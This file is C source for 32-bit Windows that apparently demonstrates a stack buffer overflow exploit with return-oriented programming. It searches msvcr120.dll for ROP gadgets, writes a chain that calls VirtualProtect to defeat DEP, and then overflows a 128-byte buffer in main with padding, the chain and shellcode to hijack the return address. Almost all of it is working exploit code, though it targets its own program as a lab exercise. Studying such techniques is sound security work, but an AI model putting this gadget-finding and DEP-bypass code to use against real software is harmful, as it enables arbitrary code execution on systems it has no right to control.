#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

#include "Header.h"

extern int rop_chain[];
extern int rop_chain_len;
extern char *shellcode;
extern int shellcode_len;
extern char payload[];
extern int payload_len;

char* search_mem(char* pmem, int limit, char* buf, int n)
{
	while (limit - n >= 0) {
		if (memcmp(pmem, buf, n) == 0) {
			return pmem;
		}
		pmem++;
		limit--;
	}
	return NULL;
}

bool GetBaseAndVirtualSizeOfSection(HMODULE hModule, DWORD *pBase, DWORD *pVirtualSize, const char *pszName)
{
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)hModule + pDosHeader->e_lfanew);
	DWORD numSecs = pNtHeaders->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((PCHAR)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
	for (DWORD i = 0; i < numSecs; i++) {
		if (0 == strcmp((const char*)(pSecHeader->Name), pszName)) {
			*pBase = (DWORD)hModule + pSecHeader->VirtualAddress;
			*pVirtualSize = pSecHeader->Misc.VirtualSize;
			return true;
		}
		pSecHeader++;
	}
	return false;
}

DWORD GetImageSize(HMODULE hModule)
{
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)hModule + pDosHeader->e_lfanew);
	return pNtHeaders->OptionalHeader.SizeOfImage;
}

void create_rop_chain(const wchar_t *lib_name)
{
	HMODULE hModule = GetModuleHandle(lib_name);
	DWORD textBase, textSize, dataBase, dataSize;
	if (!GetBaseAndVirtualSizeOfSection(hModule, &textBase, &textSize, ".text")) return;
	if (!GetBaseAndVirtualSizeOfSection(hModule, &dataBase, &dataSize, ".data")) return;

	char *code_start, *code_end;
	int code_len;
	char *p = NULL;
	FILE *file = fopen("rop_chain.txt", "w");
	fprintf(file, "\t// [%ws] base = 0x%.8x\n", lib_name, hModule);

	__asm
	{
		mov eax, __code1_start;
		mov code_start, eax;
		mov eax, __code1_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # pop ebp # ret [%ws]\n", (int)p, lib_name);
	fprintf(file, "\t0x%.8x, // # skip 4 bytes [%ws]\n", (int)p, lib_name);

	__asm
	{
		mov eax, __code2_start;
		mov code_start, eax;
		mov eax, __code2_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # pop ebx # ret [%ws]\n", (int)p, lib_name);
	fprintf(file, "\t0x%.8x, // 0x%.8x -> ebx [%ws]\n", 0x201, 0x201, lib_name);
	
	__asm
	{
		mov eax, __code3_start;
		mov code_start, eax;
		mov eax, __code3_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # pop edx # ret [%ws]\n", (int)p, lib_name);
	fprintf(file, "\t0x%.8x, // 0x%.8x -> edx [%ws]\n", 0x40, 0x40, lib_name);

	__asm
	{
		mov eax, __code4_start;
		mov code_start, eax;
		mov eax, __code4_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # pop ecx # ret [%ws]\n", (int)p, lib_name);
	fprintf(file, "\t0x%.8x, // &writable location [%ws]\n", dataBase, lib_name);
	
	__asm
	{
		mov eax, __code5_start;
		mov code_start, eax;
		mov eax, __code5_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # pop edi # ret [%ws]\n", (int)p, lib_name);

	__asm
	{
		mov eax, __code11_start;
		mov code_start, eax;
		mov eax, __code11_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # ret [%ws]\n", (int)p, lib_name);

	__asm
	{
		mov eax, __code6_start;
		mov code_start, eax;
		mov eax, __code6_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # pop esi # ret [%ws]\n", (int)p, lib_name);
	
	__asm
	{
		mov eax, __code7_start;
		mov code_start, eax;
		mov eax, __code7_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # jmp eax [%ws]\n", (int)p, lib_name);
	
	__asm
	{
		mov eax, __code8_start;
		mov code_start, eax;
		mov eax, __code8_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # pop eax # ret [%ws]\n", (int)p, lib_name);

	FARPROC pfn = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "VirtualProtect");
	fprintf(file, "\t0x%.8x, // entry of VirtualProtect() [kernel32.dll]\n", (int)pfn);
		
	__asm
	{
		mov eax, __code9_start;
		mov code_start, eax;
		mov eax, __code9_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x, // # pushad(push eax, ecx, edx, ebx, original esp, ebp, esi, edi) # ret [%ws]\n", (int)p, lib_name);
		
	__asm
	{
		mov eax, __code10_start;
		mov code_start, eax;
		mov eax, __code10_end;
		mov code_end, eax;
	}
	code_len = code_end - code_start;
	p = search_mem((char*)textBase, textSize, code_start, code_len);
	fprintf(file, "\t0x%.8x // # push esp # ret [%ws]", (int)p, lib_name);

	fclose(file);
	return;

__code1_start:
	__asm
	{
		pop ebp;
		ret;
	}
__code1_end:

__code2_start:
	__asm
	{
		pop ebx;
		ret;
	}
__code2_end:

__code3_start:
	__asm
	{
		pop edx;
		ret;
	}
__code3_end:

__code4_start:
	__asm
	{
		pop ecx;
		ret;
	}
__code4_end:

__code5_start:
	__asm
	{
		pop edi;
		ret;
	}
__code5_end:

__code6_start:
	__asm
	{
		pop esi;
		ret;
	}
__code6_end:

__code7_start:
	__asm jmp eax;
__code7_end:

__code8_start:
	__asm
	{
		pop eax;
		ret;
	}
__code8_end:

__code9_start:
	__asm
	{
		pushad; // push eax, ecx, edx, ebx, original esp, ebp, esi, edi
		ret;
	}
__code9_end:

__code10_start:
	__asm
	{
		push esp;
		ret;
	}
__code10_end:

__code11_start:
	__asm ret;
__code11_end:
	return;
}

// Release版本会把strcpy优化掉(直接嵌入strcpy的代码), 所以需要自己写一个
char* vulnerable_strcpy(char *dst, const char *src)
{
	char *_dst = dst;
	while ((*dst++ = *src++) != '\0');
	return _dst;
}

int main()
{
#if 0
	create_rop_chain(TEXT("msvcr120.dll"));
#else
	char buf[128];
	memset(buf, 0xaa, sizeof(buf)); // mark buf, for debugging
	printf("&buf = %.8x\n", (int)buf);

	memset(payload, 'A', sizeof(buf) + 4); // payload一直覆盖到返回地址前
	memcpy(payload + sizeof(buf) + 4, // rop_chain从返回地址处开始
		rop_chain,
		rop_chain_len);
	vulnerable_strcpy(payload + sizeof(buf) + 4 + rop_chain_len, // rop_chain后跟shellcode
		shellcode);
	memcpy(buf, payload, payload_len); // overflow
#endif
}